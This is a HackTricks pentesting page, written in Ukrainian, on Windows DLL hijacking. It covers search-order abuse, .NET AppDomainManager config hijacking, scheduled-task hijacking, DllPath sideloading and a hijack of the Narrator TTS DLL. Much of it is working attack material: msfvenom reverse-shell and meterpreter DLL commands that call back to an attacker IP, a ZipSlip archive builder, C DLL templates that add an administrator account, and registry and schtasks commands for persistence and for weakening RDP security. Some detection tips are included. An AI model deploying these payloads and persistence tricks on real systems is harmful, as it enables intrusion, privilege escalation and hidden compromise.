# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking передбачає маніпуляцію довіреною програмою, щоб змусити її завантажити шкідливу DLL. Цей термін охоплює кілька тактик, зокрема **DLL Spoofing, Injection та Side-Loading**. Переважно він використовується для виконання коду, забезпечення persistence і, рідше, privilege escalation. Попри зосередженість цього розділу на підвищенні привілеїв, метод hijacking залишається однаковим для різних цілей.

### Поширені техніки

Для DLL hijacking застосовують кілька методів, ефективність кожного з яких залежить від стратегії завантаження DLL, яку використовує програма:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Заміна справжньої DLL на шкідливу, за потреби з використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: Розміщення шкідливої DLL у шляху пошуку перед легітимною DLL з використанням шаблону пошуку програми.
3. **Phantom DLL Hijacking**: Створення шкідливої DLL, яку програма завантажить, вважаючи її неіснуючою необхідною DLL.
4. **DLL Redirection**: Зміна параметрів пошуку, таких як `%PATH%`, або файлів `.exe.manifest` / `.exe.local`, щоб спрямувати програму до шкідливої DLL.
5. **WinSxS DLL Replacement**: Заміна легітимної DLL на шкідливу копію в каталозі WinSxS — метод, який часто пов'язують із DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення шкідливої DLL у контрольованому користувачем каталозі разом із копією програми, подібно до технік Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Класичний DLL sideloading — не єдиний спосіб змусити довірений процес **.NET Framework** завантажити код атакувальника. Якщо цільовий виконуваний файл є **managed**-застосунком, CLR також перевіряє файл конфігурації застосунку з іменем, що відповідає виконуваному файлу (наприклад, `Setup.exe.config`). Цей файл може визначати власний **AppDomainManager**. Якщо конфігурація вказує на контрольовану атакувальником assembly, розміщену поруч із EXE, CLR завантажує її **до звичайного шляху виконання коду застосунку** та запускає всередині довіреного процесу.<sup>[[24]](#references)</sup>

Відповідно до схеми конфігурації .NET Framework від Microsoft, для використання власного manager мають бути присутні обидва елементи — `<appDomainManagerAssembly>` і `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Мінімальна конфігурація:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Мінімальний менеджер:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Практичні примітки:
- Це tradecraft, специфічний для **.NET Framework**. Він залежить від аналізу конфігурації CLR, а не від порядку пошуку DLL у Win32.
- Host має справді бути **managed EXE**. Швидка triage-перевірка: `sigcheck -m target.exe`, `corflags target.exe` або перевірка наявності **CLR Runtime Header** у метаданих PE.
- Ім'я конфігураційного файлу має точно відповідати імені executable (`<binary>.config`) і зазвичай файл розташований **поруч з EXE**.
- Це корисно зі **підписаними бінарними файлами Microsoft/vendor**, оскільки довірений EXE залишається незміненим, а шкідлива managed assembly виконується in-process.
- Якщо у вас уже є каталог інсталятора/оновлень із правом запису, AppDomainManager hijacking можна використати як **перший stage**, а потім застосувати класичний DLL sideloading або reflective loading для наступних stage.

### AppDomainManager як downloader + bootstrap запланованого завдання

Практичний шаблон intrusion полягає в поєднанні довіреного managed EXE із шкідливими `*.config` і DLL AppDomainManager, яка виконує роль лише **невеликого bootstrapper**:<sup>[[25]](#references)</sup>

1. Користувач запускає підписаний .NET installer або updater із правдоподібного розташування, наприклад `%USERPROFILE%\Downloads`.
2. Сусідній config змушує CLR завантажити attacker assembly **до** початку виконання логіки легітимного застосунку.
3. Шкідливий manager виконує **path gate** (наприклад, продовжує роботу лише якщо host EXE запущено з `Downloads`, а другий stage дозволяє запускати лише з `%LOCALAPPDATA%`).
4. Якщо перевірка проходить, він завантажує справжній payload у шлях, доступний для запису користувачу, наприклад `%LOCALAPPDATA%\PerfWatson2.exe`, і встановлює persistence за допомогою scheduled task.

Чому цей варіант важливий:
- Підписаний host EXE залишається незміненим, тому triage, під час якого перевіряється лише hash основного бінарного файла, може не виявити compromise.
- Простий **path-based anti-analysis** є поширеним: навмисне переміщення тріади ZIP/EXE/DLL на Desktop, Temp або шлях sandbox може зламати chain.
- DLL AppDomainManager першого stage може залишатися малою та непомітною, тоді як справжній implant завантажується пізніше.

Мінімальний приклад persistence, який часто зустрічається в цьому шаблоні:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Примітки:
- ` /rl highest` означає **найвищий доступний рівень** для цього користувача/сеансу; сам по собі він не гарантує ескалацію до SYSTEM.
- Цю техніку часто правильніше класифікувати як **виконання/персистентність через зловживання конфігурацією .NET**, а не як класичний missing-DLL search-order hijacking, хоча оператори часто поєднують обидва підходи.

Ключові ознаки для виявлення:
- Підписані .NET executable, запущені з **шляхів розпакування ZIP**, `Downloads`, `%TEMP%` або інших папок, доступних для запису користувачем, із **розташованим поруч** `<exe>.config`.
- Нові scheduled tasks, дії яких вказують на `%LOCALAPPDATA%`, `%APPDATA%` або `Downloads`, а їхні назви імітують browser/vendor updaters.
- Короткоживучі managed bootstrap processes, які одразу завантажують інший EXE, а потім запускають `schtasks.exe`.
- Зразки, які завершують роботу на ранньому етапі, якщо шлях до executable не відповідає очікуваній директорії профілю користувача.

### Перехоплення наявного scheduled task для повторного запуску sideload chain

Для persistence не слід зосереджуватися лише на **створенні нового task**. Деякі intrusion sets очікують, поки легітимний інсталятор створить **звичайний updater task**, а потім **перезаписують action**, щоб наявні назва, автор і trigger залишалися знайомими для захисників.

Багаторазово використовуваний workflow:
1. Встановіть/запустіть легітимне програмне забезпечення та визначте task, який воно зазвичай створює.
2. Експортуйте XML task і зафіксуйте поточні значення `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Замініть лише action, щоб task запускав ваш **trusted host EXE** зі staging-директорії, доступної для запису користувачем; цей EXE потім виконає side-load або AppDomain-load реального payload.
4. Повторно зареєструйте task із тією самою назвою замість створення нового очевидного persistence-артефакту.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Чому це непомітніше:
- Назва завдання все ще може виглядати легітимною (наприклад, як updater постачальника).
- Його запускає **Task Scheduler service**, тому перевірка батьківського процесу/предків часто бачить очікуваний ланцюжок планувальника замість `explorer.exe`.
- DFIR-команди, які шукають лише **нові назви завдань**, можуть пропустити завдання, реєстрація якого вже існувала, але його action тепер вказує на `%LOCALAPPDATA%`, `%APPDATA%` або інший шлях, контрольований атакером.

Швидкі точки для пошуку:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівнюйте XML-файли `C:\Windows\System32\Tasks\*` і метадані `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з baseline.
- Створюйте alert, коли **updater-завдання, що виглядає як завдання постачальника**, запускається з **каталогів, доступних для запису користувачем**, або запускає .NET EXE із розташованим поруч файлом `*.config`.

> [!TIP]
> Щоб переглянути покроковий ланцюжок, який поєднує HTML staging, AES-CTR configs і .NET implants із DLL sideloading, ознайомтеся з наведеним нижче workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх Dll

Найпоширеніший спосіб знайти відсутні Dll у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із sysinternals і **встановити** **такі 2 фільтри**:

![Common Techniques - Пошук відсутніх Dll: Найпоширеніший спосіб знайти відсутні Dll у системі — запустити procmon із sysinternals і встановити такі 2 фільтри](<../../../images/image (961).png>)

![Common Techniques - Пошук відсутніх Dll: Найпоширеніший спосіб знайти відсутні Dll у системі — запустити procmon із sysinternals і встановити такі 2 фільтри](<../../../images/image (230).png>)

і показати лише **File System Activity**:

![Common Techniques - Пошук відсутніх Dll: і показати лише File System Activity](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні dll загалом**, **залиште** це запущеним на кілька **секунд**.\
Якщо ви шукаєте **відсутню DLL у конкретному executable**, встановіть додатковий фільтр, наприклад **"Process Name" "contains" `<exec name>`**, запустіть його та припиніть захоплення подій.<sup>[[9]](#references)</sup>

## Експлуатація відсутніх Dll

Щоб підвищити привілеї, шукайте **DLL, яку привілейований процес намагається завантажити** з розташування, доступного вам для запису. Це може статися, коли ви контролюєте каталог, який перевіряється раніше за каталог із легітимною DLL, або коли запитувана DLL не існує, а ви можете записати в один із каталогів, що перевіряються.

### Порядок пошуку Dll

**У** [**документації Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **описано, як саме завантажуються Dll.**

**Windows applications** шукають DLL за набором **попередньо визначених шляхів**, дотримуючись певної послідовності. DLL hijacking виникає, коли шкідливу DLL стратегічно розміщено в одному з цих каталогів, завдяки чому її буде завантажено раніше за справжню DLL. Щоб запобігти цьому, application має використовувати абсолютні шляхи під час звернення до потрібних DLL.

Нижче наведено **порядок пошуку DLL у 32-бітних** системах:

1. Каталог, з якого application було завантажено.
2. Системний каталог. Використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), щоб отримати шлях до цього каталогу.(_C:\Windows\System32_)
3. 16-бітний системний каталог. Функції для отримання шляху до цього каталогу немає, але він перевіряється. (_C:\Windows\System_)
4. Каталог Windows. Використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), щоб отримати шлях до цього каталогу.
1. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, перелічені в змінній середовища PATH. Зверніть увагу, що сюди не входить шлях для конкретного application, заданий ключем реєстру **App Paths**. Ключ **App Paths** не використовується під час обчислення шляху пошуку DLL.

Це **порядок пошуку за замовчуванням** із увімкненим **SafeDllSearchMode**. Якщо його вимкнено, поточний каталог переміщується на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням функцію увімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликано з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі executable module, який завантажує **LoadLibraryEx**.

Нарешті, DLL можна завантажити за абсолютним шляхом, а не за назвою. У такому разі Windows шукає саму DLL лише за цим шляхом; залежності, запитані за назвою, усе ще використовують відповідний порядок пошуку.

Існують інші способи змінити порядок пошуку, але я не пояснюватиму їх тут.

### Перетворення довільного запису у hijack відсутньої DLL

1. Використовуйте фільтри **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), щоб зібрати назви DLL, які process перевіряє, але не може знайти.<sup>[[14]](#references)</sup>
2. Якщо binary запускається за **schedule/service**, розміщення DLL з однією з таких назв у **application directory** (елемент пошуку №1) призведе до її завантаження під час наступного запуску. В одному випадку зі сканером .NET process шукав `hostfxr.dll` у `C:\samples\app\` перед завантаженням справжньої копії з `C:\Program Files\dotnet\fxr\...`.
3. Створіть payload DLL (наприклад, reverse shell) з будь-яким export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваш primitive — це **довільний запис у стилі ZipSlip**, створіть ZIP, запис якого виходить за межі extraction dir, щоб DLL опинилася в app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Доставте архів до контрольованої inbox/share; коли scheduled task повторно запустить процес, він завантажить malicious DLL і виконає ваш код від імені service account.

### Примусове DLL sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Розширений спосіб детерміновано вплинути на шлях пошуку DLL новоствореного процесу — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою native APIs з ntdll. Якщо вказати тут контрольований attacker'ом каталог, цільовий процес, який знаходить імпортовану DLL за іменем (без абсолютного шляху та без використання safe loading flags), можна змусити завантажити malicious DLL із цього каталогу.

Ключова ідея
- Створіть параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть custom DllPath, що вказує на контрольовану вами папку (наприклад, каталог, де розташований ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли target binary знаходить DLL за іменем, loader перевіряє вказаний DllPath під час resolution, що забезпечує надійне sideloading, навіть якщо malicious DLL не розташована поруч із target EXE.

Примітки/обмеження
- Це впливає на дочірній процес, який створюється; це відрізняється від SetDllDirectory, що впливає лише на поточний процес.
- Target має імпортувати DLL або викликати LoadLibrary за іменем (без абсолютного шляху та без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко задані абсолютні шляхи неможливо hijack'нути. Forwarded exports і SxS можуть змінити пріоритет.

Мінімальний приклад C (ntdll, wide strings, спрощена обробка помилок):

<details>
<summary>Повний приклад C: примусове DLL sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Приклад практичного використання
- Розмістіть шкідливий xmllite.dll (який експортує необхідні функції або проксіює виклики до справжньої бібліотеки) у вашому каталозі DllPath.
- Запустіть підписаний binary, про який відомо, що він шукає xmllite.dll за іменем, використовуючи описану вище техніку. Loader розв’язує імпорт через указаний DllPath і виконує sideload вашої DLL.

У wild спостерігалося використання цієї техніки для створення багатостадійних ланцюжків sideloading: початковий launcher скидає helper DLL, яка потім запускає підписаний Microsoft binary, вразливий до hijacking, із власним DllPath, щоб примусово завантажити DLL зловмисника зі staging-каталогу.<sup>[[6]](#references)</sup>


### Hijacking .NET AppDomainManager через `.exe.config`

Для цілей **.NET Framework** sideloading можна виконати **до `Main()`** без patching пам’яті, зловживаючи розташованим поруч із програмою файлом **`.exe.config`**. Замість того щоб покладатися лише на порядок пошуку DLL Win32, зловмисник розміщує легітимний .NET EXE поруч зі шкідливою конфігурацією та однією або кількома збірками під контролем зловмисника.

Як працює цей ланцюжок:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE запускається, і **CLR читає `<exe>.config`**.
2. Конфігурація встановлює **`<appDomainManagerAssembly>`** і **`<appDomainManagerType>`**, щоб runtime створив контрольований зловмисником `AppDomainManager`.
3. Шкідливий manager отримує виконання **до `Main()`** усередині довіреного host process.
4. Та сама конфігурація може змусити CLR спочатку розв’язувати локальні збірки (наприклад, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) і послабити runtime validation/telemetry без inline patching.

Шаблон у стилі campaign (точна вкладеність може відрізнятися залежно від директиви / версії CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Чому це корисно:
- **`<probing privatePath="."/>`** зберігає resolution assembly у каталозі застосунку, перетворюючи папку на передбачувану поверхню для sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** переміщують виконання в код атакувальника під час ініціалізації CLR, ще до запуску логіки легітимного застосунку.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** може дозволити full-trust застосунку завантажувати unsigned або tampered assemblies без помилки перевірки strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** уникає перенаправлень publisher policy до новіших assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** робить вибір runtime більш детермінованим.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** особливо цікавий, оскільки **CLR вимикає власну видимість через ETW** із конфігурації, замість того щоб implant патчив `EtwEventWrite` у пам’яті.

Операційна схема, яку спостерігали в нещодавніх кампаніях:
- Етап 1 скидає `setup.exe`, `setup.exe.config` і локальні assemblies.
- Етап 2 копіює їх у правдоподібну папку **AppData update**, перейменовує host на щось на кшталт `update.exe` і повторно запускає його через **scheduled task**.
- Етап 3 перевіряє контекст виконання, наприклад очікуваний parent `svchost.exe` від Task Scheduler, перед завантаженням фінального RAT DLL/export.

Ідеї для threat hunting:
- Підписані або іншим чином легітимні **.NET executables**, що запускаються з підозрілими сусідніми файлами **`.config`** у місцях, доступних для запису користувачам.
- Файли `.config`, що містять **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** або **`etwEnable enabled="false"`**.
- Scheduled tasks, які повторно запускають перейменовані update binaries із **`%LOCALAPPDATA%`** або спеціальних для застосунку каталогів `\bin\update\`.
- Parent/child chains, у яких scheduled task запускає trusted .NET host, що одразу завантажує non-vendor assemblies із власного каталогу.

#### Винятки щодо порядку пошуку dll у документації Windows

У документації Windows зазначено певні винятки зі стандартного порядку пошуку DLL:

- Якщо виявлено **DLL, яка має таке саме ім’я, як DLL, уже завантажена в пам’ять**, система обходить звичайний пошук. Натомість вона перевіряє redirection і manifest, перш ніж використовувати DLL, уже завантажену в пам’ять. **У цьому сценарії система не виконує пошук DLL**.
- Якщо DLL розпізнано як **known DLL** для поточної версії Windows, система використовує власну версію known DLL разом з усіма її залежними DLL, **пропускаючи процес пошуку**. Розділ реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список таких known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони були вказані лише своїми **module names**, незалежно від того, чи початкову DLL було знайдено за повним шляхом.

### Підвищення привілеїв

**Вимоги**:

- Визначити процес, який працює або працюватиме з **іншими привілеями** (horizontal або lateral movement) і якому **бракує DLL**.
- Переконатися, що доступ на запис надано до будь-якого **каталогу**, у якому виконуватиметься **пошук DLL**. Це може бути каталог executable або каталог у системному шляху.

За замовчуванням ці передумови трапляються рідко: привілейовані executables зазвичай не мають відсутніх DLL dependencies, а стандартні користувачі зазвичай не можуть записувати до каталогів системних search paths. Неправильно налаштовані середовища все ж можуть забезпечити виконання обох умов.\
Якщо вимоги виконано, перевірте проєкт [UACME](https://github.com/hfiref0x/UACME). Хоча його основна мета — UAC bypass, він містить DLL-hijacking PoCs для окремих версій Windows, які часто можна адаптувати до знайденого каталогу, доступного для запису.

Зверніть увагу, що **перевірити дозволи для папки** можна так:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи всіх папок усередині PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити імпорти виконуваного файла та експорти DLL за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного посібника про те, як **зловживати Dll Hijacking для підвищення привілеїв** із дозволами на запис до папки **System Path**, перегляньте:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви дозволи на запис до будь-якої папки всередині system PATH.\
Іншими цікавими автоматизованими інструментами для виявлення цієї вразливості є **функції PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Приклад

Якщо ви виявили придатний для експлуатації сценарій, однією з найважливіших умов успішної експлуатації буде **створення dll, яка експортує щонайменше всі функції, які виконуваний файл імпортуватиме з неї**. Водночас зверніть увагу, що Dll Hijacking може бути корисним для [підвищення рівня цілісності з Medium до High **(обхід UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з [**High Integrity до SYSTEM**](../index.html#from-high-integrity-to-system)**.** Приклад того, **як створити коректну dll**, можна знайти в цьому дослідженні Dll Hijacking, зосередженому на Dll Hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділі** ви знайдете деякі **базові коди dll**, які можуть бути корисними як **шаблони** або для створення **dll з експортованими функціями, які не є обов'язковими**.

## **Створення та компіляція Dlls**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатна **виконати ваш шкідливий код під час завантаження**, а також **надавати** та **працювати** так, **як очікується**, переспрямовуючи всі виклики до справжньої бібліотеки.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви можете **вказати виконуваний файл і вибрати бібліотеку**, яку хочете проксіювати, та **згенерувати proxified dll**, або **вказати Dll** і **згенерувати proxified dll**.

### **Meterpreter**

**Отримання rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримайте meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створення користувача (x86, версії x64 я не знайшов):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Власний

У багатьох випадках скомпільована вами DLL має **експортувати кожну функцію, імпортовану процесом-жертвою**. Якщо необхідний експорт відсутній, бінарний файл не може його визначити, і exploit завершується невдало.

<details>
<summary>Шаблон C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна C DLL із точкою входу потоку</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Практичний приклад: DLL Hijack локалізації Narrator OneCore TTS (Accessibility/ATs)

Windows Narrator.exe під час запуску все ще перевіряє передбачувану мовозалежну DLL локалізації, яку можна захопити для довільного виконання коду та persistence.<sup>[[7]](#references)</sup>

Ключові факти
- Шлях перевірки (поточні збірки): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Застарілий шлях (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо за шляхом OneCore існує доступна для запису DLL, контрольована атакером, її буде завантажено, а `DllMain(DLL_PROCESS_ATTACH)` виконається. Експорти не потрібні.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` і `Operation is Load Image` або `CreateFile`.
- Запустіть Narrator і спостерігайте за спробою завантаження вказаного вище шляху.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Наївний hijack буде озвучувати дії або підсвічувати елементи UI. Щоб залишатися непомітним, під час attach перелічіть потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і призупиніть його через `SuspendThread`; продовжуйте виконання у власному потоці. Повний код див. у PoC.<sup>[[8]](#references)</sup>

Trigger and persistence via Accessibility configuration
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- За допомогою наведених вище налаштувань запуск Narrator завантажує підкладену DLL. На secure desktop (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Дозвольте класичний рівень безпеки RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
